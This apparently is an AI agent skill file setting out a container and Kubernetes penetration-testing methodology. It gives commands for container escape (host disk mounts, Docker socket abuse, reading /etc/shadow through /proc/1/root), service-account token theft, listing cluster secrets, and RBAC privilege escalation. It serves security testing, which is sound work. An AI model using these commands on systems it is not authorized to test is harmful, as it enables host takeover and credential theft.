---
name: container-security
description: Container and Kubernetes security methodology. Covers Docker container escape vectors (privileged, SYS_ADMIN, docker socket, /proc/1/root), Kubernetes RBAC abuse, service account token theft, pod-to-cluster-admin escalation paths, K8s network policy bypass, container runtime CVEs (runC, containerd), and admission controller misconfigurations. Use when testing containerized environments, Kubernetes clusters, or Docker deployments.
---

# Container Security Methodology

## Phase 0: Container Reconnaissance (from inside)

```bash
# Am I in a container?
cat /proc/1/cgroup | head -3
ls -la /.dockerenv 2>/dev/null
ls -la /run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo "K8s pod"

# Current privileges
id
cat /proc/1/status | grep Cap
capsh --print 2>/dev/null

# Mounted filesystems
mount | grep -E "proc|sys|docker|host"
```

## Phase 1: Container Escape Vectors

| Vector | Precondition | Command |
|--------|-------------|---------|
| Privileged | `--privileged` flag | `mount /dev/sda1 /mnt/host` |
| SYS_ADMIN cap | `--cap-add=SYS_ADMIN` | `mount -t proc none /proc` |
| Docker socket | `/var/run/docker.sock` mounted | `docker run -v /:/host -it alpine` |
| containerd socket | `/run/containerd/containerd.sock` | `ctr run --privileged ...` |
| /proc/1/root | Running as root | `cat /proc/1/root/etc/shadow` |
| CVE-2019-5736 | runC < 1.0-rc10 | Overwrite runC binary from inside |
| CVE-2024-21626 | runC <= 1.1.11 | `proc/self/fd/X` path traversal |

## Phase 2: Kubernetes Post-Exploitation

```bash
# Service account enumeration
K8S_TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
K8S_CA=/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S_NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)

# Check permissions
curl -s --cacert $K8S_CA -H "Authorization: Bearer $K8S_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$K8S_NS/pods | jq '.items[].metadata.name'

# List secrets in namespace
curl -s --cacert $K8S_CA -H "Authorization: Bearer $K8S_TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets | jq '.items[].metadata.name'
```

## Phase 3: RBAC Abuse Patterns

| RBAC Permission | Abuse |
|----------------|-------|
| `pods/exec` | Execute commands in any pod |
| `pods/portforward` | Tunnel to internal services |
| `secrets` get | Extract all secrets |
| `deployments` create | Deploy privileged container |
| `cluster-admin` (default SA) | Full cluster compromise |
| `impersonate` | Impersonate privileged users |
